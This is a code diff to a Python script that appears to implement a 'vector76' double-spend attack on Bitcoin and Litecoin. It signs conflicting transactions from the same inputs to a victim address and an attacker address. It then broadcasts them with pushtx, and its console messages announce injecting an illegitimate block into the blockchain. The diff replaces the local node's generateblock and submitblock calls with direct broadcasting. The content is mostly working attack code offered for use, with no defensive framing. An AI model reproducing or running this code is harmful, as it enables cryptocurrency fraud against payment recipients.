@@ -34,14 +34,6 @@ parser.add_argument("--is_testnet",
                     help="Testnet flag (Default=True)",
                     default=True,
                     type=bool)
-parser.add_argument("--username",
-                    "-u",
-                    help="conf username",
-                    type=str)
-parser.add_argument("--password",
-                    "-p",
-                    help="conf password",
-                    type=str)
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
@@ -106,8 +98,6 @@ attacker_address = args.attacker_address
 amount_btc = args.amount_of_coins
 testnet    = args.is_testnet
 coin_symbol = args.symbol
-username    = args.username
-password    = args.password
 
 if testnet:
     print("testnet mode")
@@ -120,15 +110,8 @@ if "ltc" == coin_symbol:
     if testnet:
         port = 19332
 
-hostname = f"127.0.0.1:{port}"
-node = Bitcoin(rpcuser=username,
-               rpcpasswd=password,
-               rpchost=hostname,
-               rpcport=port)
 transaction_util = cryptos.Bitcoin(testnet=testnet)
 if coin_symbol == "ltc":
-    node = litecoin.rpc.Proxy(service_url=f"http://{username}:{password}@{hostname}",
-                              service_port=port)
     transaction_util = cryptos.Litecoin(testnet=testnet)
     print(fake_send_from)
     sender  = transaction_util.privtopub(fake_send_from)
@@ -161,21 +144,22 @@ tx_attacker = [{"address": attacker_address, "value": send_amount}]
 tx_victim   = transaction_util.signall(transaction_util.mktx_with_change(inputs, tx_victim, fee=fee), fake_send_from)
 tx_attacker = transaction_util.signall(transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee), fake_send_from)
 
-vector76    = [tx_victim, tx_attacker]
 tx_victim   = cryptos.serialize(transaction_util.signall(tx_victim, fake_send_from))
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, fake_send_from))
-#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
+vector76    = f"{tx_victim}{tx_attacker}"
+#[tx_victim, tx_attacker]
+#vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 #vector76 = transaction_util.mktx_with_change(inputs, cryptos.deserialize(vector76), fee=fee)
 #vector76_block = cryptos.serialize(transaction_util.signall(vector76, fake_send_from))
 
-print("Generating vector76 Block...")
-payload = [attacker_address, vector76]
-payload = json.dumps(payload)
-print(payload)
-exit()
-data = node.call("generateblock", payload)
-print(data)
+#print("Generating vector76 Block...")
+#payload = [attacker_address, vector76]
+#payload = json.dumps(payload)
+#print(payload)
+#exit()
+#data = node.call("generateblock", payload)
+#print(data)
 print()
 print("[+] READY...")
 print()
@@ -184,7 +168,7 @@ print("--------------------")
 print(f"Send to                       : {victim_address}")
 print(f"Send Amount   (Satoshi unit)  : {send_amount} Satoshi")
 print(f"Signed victim   Signed RawTx  : {tx_victim}")
-print(f"vector76                      : {vector76_block}")
+print(f"vector76                      : {vector76}")
 print(f"Testnet Mode              : {testnet}")
 print("--------------------")
 print()
@@ -205,12 +189,12 @@ print("Index > 強固なブロックチェーン技術に対して強制干渉�
 print()
 time.sleep(0.7)
 print("SND IBLK TOBC  (不正なブロックを、ブロックチェーンに送信!)")
-print()
-node.call("submitblock", data)
-time.sleep(0.7)
-#transaction_util.pushtx(vector76_block)
-print("Submit Block ...")
-submit_block(data)
+#print()
+#node.call("submitblock", data)
+#time.sleep(0.7)
+transaction_util.pushtx(vector76)
+#print("Submit Block ...")
+#submit_block(data)
 print()
 #txid2 = transaction_util.pushtx(tx_attacker)
 print("OK")
